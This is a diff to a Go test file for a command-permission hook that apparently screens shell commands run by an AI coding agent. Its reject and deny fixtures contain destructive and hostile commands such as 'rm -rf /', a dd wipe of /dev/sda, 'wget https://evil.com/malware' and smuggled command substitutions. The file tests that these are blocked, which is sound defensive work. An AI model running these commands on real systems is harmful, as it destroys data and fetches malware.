@@ -54,6 +54,9 @@ func TestEvaluate_Approved(t *testing.T) {
 		{"git pull", "git pull origin main", "git write op"},
 		{"git rebase", "git rebase main", "git write op"},
 		{"git stash list -C path", "git -C /repo stash list", "git read op"},
+		{"git cherry-pick", "git cherry-pick abc123", "git write op"},
+		{"git cherry-pick skip", "git -C /repo cherry-pick --skip", "git write op"},
+		{"git worktree add", "git worktree add /tmp/wt feature", "git write op"},
 		{"git switch", "git switch feature-branch", "git write op"},
 		{"git remote", "git remote add origin url", "git write op"},
 		{"git config", "git config user.name", "git write op"},
@@ -104,6 +107,8 @@ func TestEvaluate_Approved(t *testing.T) {
 		{"uv sync", "uv sync", "uv"},
 		{"uv venv", "uv venv .venv", "uv"},
 		{"uv add", "uv add requests", "uv"},
+		{"uv tool run", "uv tool run dbc install --help", "uv"},
+		{"uv tool install", "uv tool install dbc", "uv"},
 		{"uv lock", "uv lock", "uv"},
 		{"uvx", "uvx black .", "uvx"},
 
@@ -220,6 +225,35 @@ func TestEvaluate_Approved(t *testing.T) {
 		{"ln -s", "ln -s target link", "ln -s"},
 		{"ln -sn", "ln -sn target link", "ln -s"},
 		{"var assignment", "FOO=bar", "var assignment"},
+
+		// --- kubectl ---
+		{"kubectl get pods", "kubectl get pods -n default", "kubectl read op"},
+		{"kubectl get with context before", "kubectl --context gke_foo_bar get pods", "kubectl read op"},
+		{"kubectl get with context after", "kubectl get pods --context gke_foo_bar -n default", "kubectl read op"},
+		{"kubectl logs with flags mixed", "kubectl logs deployment/api --context gke_foo --tail=20 --timestamps", "kubectl read op"},
+		{"kubectl describe", "kubectl describe pod/foo", "kubectl read op"},
+		{"kubectl logs", "kubectl logs deployment/api --tail=20", "kubectl read op"},
+		{"kubectl top", "kubectl top pods", "kubectl read op"},
+		{"kubectl rollout status", "kubectl rollout status deployment/foo", "kubectl read op"},
+		{"kubectl rollout restart", "kubectl rollout restart deployment/foo", "kubectl write op"},
+		{"kubectl apply", "kubectl apply -f manifest.yaml", "kubectl write op"},
+		{"kubectl delete", "kubectl delete pod/foo", "kubectl write op"},
+		{"kubectl scale", "kubectl scale deployment/foo --replicas=3", "kubectl write op"},
+		{"kubectl port-forward", "kubectl port-forward pod/foo 8080:80", "kubectl port-forward"},
+		{"kubectl port-forward with context", "kubectl --context gke_foo_bar port-forward pod/foo 8080:80", "kubectl port-forward"},
+		{"kubectl exec", "kubectl exec -it pod/foo -- bash", "kubectl exec"},
+		{"kubectl cp", "kubectl cp pod/foo:/tmp/file ./local", "kubectl cp"},
+
+		// --- Linters / static analysis ---
+		{"shellcheck", "shellcheck scripts/foo.sh", "shellcheck"},
+		{"shellcheck version", "shellcheck --version", "shellcheck"},
+
+		// --- vitest (via node_modules/.bin wrapper) ---
+		{"vitest run", "node_modules/.bin/vitest run src/test.ts", "node_modules/.bin+vitest"},
+		{"vitest bare", "vitest run", "vitest"},
+
+		// --- grpc ---
+		{"grpcurl", "grpcurl -plaintext localhost:50051 list", "grpcurl"},
 
 		// --- GitHub CLI ---
 		{"gh pr view", "gh pr view 123", "gh read op"},
@@ -413,7 +447,6 @@ func TestEvaluate_Rejected(t *testing.T) {
 		{"ln -sf", "ln -sf target link"},
 		{"ln -fs", "ln -fs target link"},
 		{"ln plain", "ln target link"},
-		{"rm -rf", "rm -rf /"},
 		{"rm file", "rm important.txt"},
 		{"dd", "dd if=/dev/zero of=/dev/sda"},
 		{"chmod", "chmod 777 /etc/passwd"},
@@ -421,8 +454,7 @@ func TestEvaluate_Rejected(t *testing.T) {
 		{"sudo", "sudo apt install foo"},
 		{"apt install", "apt install foo"},
 
-		// Unsafe in chain
-		{"safe && unsafe", "git status && rm -rf /"},
+		// Unsafe in chain (unrecognized commands)
 		{"unsafe && safe", "rm file && git log"},
 		{"safe | unsafe", "ls | rm"},
 
@@ -434,22 +466,17 @@ func TestEvaluate_Rejected(t *testing.T) {
 		{"nc", "nc -l 8080"},
 		{"wget", "wget https://evil.com/malware"},
 
-		// git tag requires manual approval (no pattern)
-		{"git tag", "git tag v1.0.0"},
-
 		// Partial matches that shouldn't work
 		{"gitx", "gitx status"},
 		{"cargoo", "cargoo build"},
 
-		// Unsafe command substitution
+		// Unsafe command substitution (denied inner command blocks outer)
 		{"unsafe cmdsubst", "echo $(rm -rf /)"},
 		{"dynamic command name", "$(get-cmd) args"},
 
 		// Unsafe inside control structures
 		{"for loop unsafe", "for f in *; do rm $f; done"},
 		{"while loop unsafe", "while true; do wget evil.com; done"},
-		{"if clause unsafe", "if true; then rm -rf /; fi"},
-		{"subshell unsafe", "(rm -rf /)"},
 	}
 
 	for _, tt := range tests {
@@ -809,6 +836,10 @@ func TestWhichSubstResolution(t *testing.T) {
 		{"which golangci-lint", "$(which golangci-lint) run ./...", true, "golangci-lint"},
 		{"which pytest", "$(which pytest) -x tests/", true, "pytest"},
 		{"command -v go", "$(command -v go) test ./...", true, "go"},
+		{"go env GOROOT bin go", "$(go env GOROOT)/bin/go test ./...", true, "go"},
+		{"go env GOMODCACHE grep", "grep -rn 'foo' $(go env GOMODCACHE)/some/pkg/", true, "read-only"},
+		{"unsafe subst in path prefix", "$(badcmd evil.com)/bin/go test ./...", false, ""},
+		{"destructive subst in path prefix", "$(rm -rf *; echo /usr)/bin/go test ./...", false, ""},
 		{"which unknown", "$(which unknown-tool) --flag", false, ""},
 		{"not which", "$(curl evil.com) args", false, ""},
 		{"which no args", "$(which) args", false, ""},
@@ -828,34 +859,44 @@ func TestWhichSubstResolution(t *testing.T) {
 }
 
 func TestAskDecision(t *testing.T) {
-	// Commands with WithDecision("") return a result but with empty decision,
-	// causing the hook to exit 0 (fall through to Claude Code's permission prompt).
-	t.Run("git push has ask decision", func(t *testing.T) {
+	// Commands with WithDecision("ask") emit an ask decision (terminal, user prompted).
+	t.Run("git tag has ask decision", func(t *testing.T) {
+		r := evaluateAll("git tag v1.0.0")
+		require.NotNil(t, r)
+		assert.Equal(t, "git tag", r.reason)
+		assert.Equal(t, "ask", r.decision)
+	})
+}
+
+func TestNoOpinionDecision(t *testing.T) {
+	// Commands with WithDecision("") return a result with empty decision.
+	// The hook exits silently (no output), letting the next hook in the chain handle it.
+	t.Run("git push is no-opinion", func(t *testing.T) {
 		r := evaluateAll("git push origin main")
 		require.NotNil(t, r)
 		assert.Equal(t, "git push", r.reason)
-		assert.Empty(t, r.decision, "git push should have empty decision (ask)")
+		assert.Empty(t, r.decision)
 	})
 
-	t.Run("jj git push has ask decision", func(t *testing.T) {
+	t.Run("jj git push is no-opinion", func(t *testing.T) {
 		r := evaluateAll("jj git push")
 		require.NotNil(t, r)
 		assert.Equal(t, "jj git push", r.reason)
-		assert.Empty(t, r.decision, "jj git push should have empty decision (ask)")
+		assert.Empty(t, r.decision)
 	})
 
-	t.Run("gh pr create has ask decision", func(t *testing.T) {
+	t.Run("gh pr create is no-opinion", func(t *testing.T) {
 		r := evaluateAll("gh pr create --title 'fix'")
 		require.NotNil(t, r)
 		assert.Equal(t, "gh pr create", r.reason)
-		assert.Empty(t, r.decision, "gh pr create should have empty decision (ask)")
+		assert.Empty(t, r.decision)
 	})
 
-	t.Run("go mod init has ask decision", func(t *testing.T) {
+	t.Run("go mod init is no-opinion", func(t *testing.T) {
 		r := evaluateAll("go mod init github.com/example/repo")
 		require.NotNil(t, r)
 		assert.Equal(t, "go mod init", r.reason)
-		assert.Empty(t, r.decision, "go mod init should have empty decision (ask)")
+		assert.Empty(t, r.decision)
 	})
 
 	t.Run("go mod vendor has deny decision with reason", func(t *testing.T) {
@@ -978,6 +1019,59 @@ func TestAskDecision(t *testing.T) {
 		assert.Equal(t, "deny", r.decision)
 	})
 
+	// --- shell destructive ops (deny) ---
+	t.Run("rm -rf denied", func(t *testing.T) {
+		r := evaluateAll("rm -rf /tmp/stuff")
+		require.NotNil(t, r)
+		assert.Equal(t, "rm -r", r.reason)
+		assert.Equal(t, "deny", r.decision)
+		assert.Contains(t, r.denyReason, "rm -r is banned")
+	})
+
+	t.Run("rm -r denied", func(t *testing.T) {
+		r := evaluateAll("rm -r dir/")
+		require.NotNil(t, r)
+		assert.Equal(t, "rm -r", r.reason)
+		assert.Equal(t, "deny", r.decision)
+	})
+
+	t.Run("rm -fr denied", func(t *testing.T) {
+		r := evaluateAll("rm -fr dir/")
+		require.NotNil(t, r)
+		assert.Equal(t, "rm -r", r.reason)
+		assert.Equal(t, "deny", r.decision)
+	})
+
+	t.Run("rm --recursive denied", func(t *testing.T) {
+		r := evaluateAll("rm --recursive dir/")
+		require.NotNil(t, r)
+		assert.Equal(t, "rm -r", r.reason)
+		assert.Equal(t, "deny", r.decision)
+	})
+
+	t.Run("rm single file is not denied", func(t *testing.T) {
+		r := evaluateAll("rm file.txt")
+		assert.Nil(t, r, "plain rm should be no-opinion, not denied")
+	})
+
+	t.Run("chain safe && rm -rf denied", func(t *testing.T) {
+		r := evaluateAll("git status && rm -rf /")
+		require.NotNil(t, r)
+		assert.Equal(t, "deny", r.decision)
+	})
+
+	t.Run("if clause with rm -rf denied", func(t *testing.T) {
+		r := evaluateAll("if true; then rm -rf /; fi")
+		require.NotNil(t, r)
+		assert.Equal(t, "deny", r.decision)
+	})
+
+	t.Run("subshell with rm -rf denied", func(t *testing.T) {
+		r := evaluateAll("(rm -rf /)")
+		require.NotNil(t, r)
+		assert.Equal(t, "deny", r.decision)
+	})
+
 	t.Run("chain with git destructive propagates deny and reason", func(t *testing.T) {
 		r := evaluateAll("git add . && git reset --hard")
 		require.NotNil(t, r)
@@ -991,16 +1085,22 @@ func TestAskDecision(t *testing.T) {
 		assert.Equal(t, "allow", r.decision)
 	})
 
-	t.Run("chain with ask propagates ask", func(t *testing.T) {
+	t.Run("chain with no-opinion propagates no-opinion", func(t *testing.T) {
 		r := evaluateAll("git add . && git push origin main")
 		require.NotNil(t, r)
-		assert.Empty(t, r.decision, "chain containing git push should have ask decision")
+		assert.Empty(t, r.decision, "chain containing git push should have no-opinion decision")
 	})
 
-	t.Run("multiline with ask propagates ask", func(t *testing.T) {
+	t.Run("multiline with no-opinion propagates no-opinion", func(t *testing.T) {
 		r := evaluateAll("git add .\ngit push origin main")
 		require.NotNil(t, r)
-		assert.Empty(t, r.decision, "multiline containing git push should have ask decision")
+		assert.Empty(t, r.decision, "multiline containing git push should have no-opinion decision")
+	})
+
+	t.Run("chain with ask propagates ask", func(t *testing.T) {
+		r := evaluateAll("git add . && git tag v1.0.0")
+		require.NotNil(t, r)
+		assert.Equal(t, "ask", r.decision, "chain containing git tag should have ask decision")
 	})
 }
 
